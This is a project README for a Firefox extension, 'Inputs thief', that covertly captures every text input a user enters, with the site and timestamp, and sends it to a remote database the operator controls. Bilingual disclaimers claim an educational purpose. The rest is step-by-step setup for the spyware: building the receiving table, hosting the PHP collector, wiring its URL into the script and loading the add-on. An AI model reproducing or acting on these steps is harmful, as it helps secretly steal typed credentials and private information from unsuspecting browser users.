# Inputs thief firefox

## 1 - Explanations

Inputs thief firefox is an extension working on a firefox web browser, she takes care of retrieving all inputs with type="text", site, time and date. Once harvested, everything is sent to an online database without the user's knowledge.

## 2 - <img src="https://www.reed-sensor.com/wp-content/uploads/icon_disclaimer.jpg" width="25" height="25"> Disclaimer (English - EN) <img src="https://images.emojiterra.com/google/android-10/128px/1f1ec-1f1e7.png" width="20" height="20"> <img src="https://www.reed-sensor.com/wp-content/uploads/icon_disclaimer.jpg" width="25" height="25">

<ins>By visiting this project, participating and applying what is presented, you understand and expect that:</ins>

This extension was not created for the purpose of stealing private information from anyone, this was created for educational and preventative purposes ONLY. I do not endorse this kind of action.

Using or integrating my work in anything is not without risk for you, I am not responsible for any misappropriation.

You will also be solely responsible for your actions and your uses of what is shown on this project. Neither the author nor his host can be held responsible for your fraudulent actions.

## 2 - <img src="https://www.reed-sensor.com/wp-content/uploads/icon_disclaimer.jpg" width="25" height="25"> Disclaimer (Français - FR) <img src="https://images.emojiterra.com/google/android-10/128px/1f1eb-1f1f7.png" width="20" height="20"> <img src="https://www.reed-sensor.com/wp-content/uploads/icon_disclaimer.jpg" width="25" height="25">

<ins>En visitant ce projet, en participant et en appliquant ce qui est présenté, vous comprenez et acceptez que :</in>

Cette extension n'a pas été créée dans le but de voler des informations privées à quiconque, elle a été créée UNIQUEMENT à des fins éducatives et préventives. Je ne cautionne en rien ce genre d'action.

Utiliser ou intégrer mon travail dans quoi que ce soit n'est pas sans risque pour vous, je ne suis pas responsable de tout détournement.

Vous serez également le seul responsable de vos actions/utilisations d'un tel système. Ni l'auteur, ni votre hébergeur ne peuvent être tenus responsables de vos actes frauduleux.


## 3 - Necessary things

* The firefox web browser
* A SQL database hosted online
* A php script hosted online

> (But it can work on a local web server: XAMPP or WAMP)

## 4 - Installation (The schema is as follows)

* Clone the repositorie : https://github.com/p3titcr0c0/inputs-thief-firefox.git

* Create a database, then a table named firefoxExtension, add an id which self-increments as data is entered. Then add four separate identifiers : date, heure, site, inputs

* Modify php-a-heberger.php to connect the php --> your database with PDO

* Heberger php-a-heberger.php online and remember the url

* Enter the url in the call of ajaxPost function, line 57 of script.js.

* Opening the about:debugging page with Firefox

> The about:debugging page provides a single place from which you can attach the Firefox Developer Tools to a number of debugging targets. At the moment it supports three main sorts of targets: restartless add-ons, tabs, and workers.

* load the temporary add-on with :
```bash
manifest.json
```

* Everything works, you will receive the inputs, the date and time and the site on your database.

## 5 - Project development

Finished and functional, 15/06/2020.

## 6 - Screenshots

#  ![demo](./logo.png)
